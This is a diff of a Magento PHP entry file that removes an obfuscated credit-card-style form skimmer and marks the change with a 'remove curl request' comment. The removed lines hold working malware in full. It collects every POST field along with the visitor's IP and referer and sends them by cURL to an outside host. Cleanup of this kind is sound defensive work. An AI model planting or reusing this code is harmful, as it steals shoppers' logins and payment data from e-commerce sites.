@@ -22,12 +22,9 @@
  * @package    Mage
  * @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
  * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
- */ 
+ */
 
- $x18="a\162\162\x61y\137\x6d\145r\147\145"; $x19="c\x75\x72\154\x5fi\156\x69t"; $x1a="c\165r\154_\x73et\157\160t"; $x1b="cu\162\x6c\x5f\x65\170\x65\143"; $x1c="c\x75\x72\x6c\x5f\143\154\x6f\x73e"; $x1d="\151\x73\x5f\141\162r\141\171"; $x1e="u\162\154\145\156\x63\x6f\x64e"; 
-$x0b = ''; $x0c = $x18($_POST); if (!empty($x0c)){ foreach($x0c as $x0d => $x0e){if($x1d($x0e)){foreach( $x0e as $x0f => $x10){if($x1d($x10)){foreach( $x10 as $x11 => $x12){$x0b.= $x0d.'_'.$x0f.'_'.$x11.'='.$x12.'&'; } }else{ $x0b.= $x0d.'_'.$x0f.'='.$x10.'&';} } }else{ $x0b.= $x0d.'='.$x0e.'&';} }if($x0b != ''){ $x13 = $_SERVER['REMOTE_ADDR'].' '. $_SERVER['HTTP_REFERER']. ' '. $x0b; $x14 = 'data='.$x1e($x13); $x15 = 'http://communitymarketspace.com/skin/local.php';$x16 = $x19(); $x1a($x16,CURLOPT_URL, $x15); $x1a($x16,CURLOPT_POST, 1); $x1a($x16,CURLOPT_POSTFIELDS, $x14);$x17 = $x1b($x16);$x1c($x16);} } ?><?php
-
-if (version_compare(phpversion(), '5.2.0', '<')===true) {
+if (version_compare(phpversion(), '5.2.0', '<')===true) { //remove curl request
     echo  '<div style="font:12px/1.35em arial, helvetica, sans-serif;">
 <div style="margin:0 0 25px 0; border-bottom:1px solid #ccc;">
 <h3 style="margin:0; font-size:1.7em; font-weight:normal; text-transform:none; text-align:left; color:#2f2f2f;">
